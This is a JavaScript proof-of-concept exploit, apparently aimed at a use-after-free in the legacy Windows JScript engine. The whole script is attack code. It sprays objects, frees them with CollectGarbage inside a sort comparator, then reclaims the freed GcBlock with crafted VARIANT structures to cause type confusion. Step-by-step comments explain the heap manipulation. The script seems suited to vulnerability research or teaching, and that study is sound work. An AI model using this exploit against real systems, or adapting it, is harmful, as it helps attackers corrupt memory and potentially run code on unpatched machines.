function makeVariant(type, obj_ptr_lower, obj_ptr_upper, next_ptr_lower, next_ptr_upper) { // Make a variant
    var charCodes = new Array();
    charCodes.push(
         // type
        type, 0, 0, 0,

         // obj_ptr
        obj_ptr_lower & 0xffff, (obj_ptr_lower >> 16) & 0xffff, obj_ptr_upper & 0xffff, (obj_ptr_upper >> 16) & 0xffff,

        // next_ptr
        next_ptr_lower & 0xffff, (next_ptr_lower >> 16) & 0xffff, next_ptr_upper & 0xffff, (next_ptr_upper >> 16) & 0xffff
        );
    return String.fromCharCode.apply(null, charCodes);
}


// Start with 16 bytes of padding to correctly align (Each string character is UTF-16)
var variants = "AAAAAAAA"; // 1 unicode char is 41 00 which is 2 bytes, 2 x 8 = 16

while(variants.length < 0x239) {
// Generate a number of variants with type 3 (int) and the value 1234
    variants += makeVariant(0x0003, 1234, 0x00000000, 0x00000000, 0x00000000);
}

var size = 20000

// Will be used to create VVAL structures
var overlay = new Array();

for(var i=0; i < size*2; i++) {
// Create a large number of arrays for later
// must be array?
    overlay[i] = new Array();
}

function compare(untracked_1, untracked_2) {

// Used to create a number of GcBlocks to be freed
    var spray = new Array();

// Create enough objects to fill more than 50 GcBlocks
    for(var i = 0; i < size; i++) spray[i] = new Object();

// Point to one of the values in a GcBlock that will be freed
// spray[i] points to an object, which is one of the VARs in one of the GCblocks
    untracked_1 = spray[7777];
    WScript.Echo("untracked_1 is a " + typeof untracked_1)  

// Cause all objects to now be unreferenced, meaning that all GcBlocks will be freed 
    for(var i=0; i < size; i++) spray[i] = 0;

// Cause a UAF by freeing the GcBlock that untracked_1 points in
    CollectGarbage();

    for(var i=0; i < size*2; i++) {
// Type Confusion: Spray VVAL structures. This will malloc with a length of ((2*len(name) + 0x42)*2 + 8). The aim is to allocate the size of GcBlock. This is because untracked_1 points to a var in a GcBlock.
        overlay[i][variants] = 1;
    }

// Read the VAR
    WScript.Echo("untracked_1 is a " + typeof untracked_1)  

    return 4;
}

// Trigger the exploit
[0,0].sort(compare);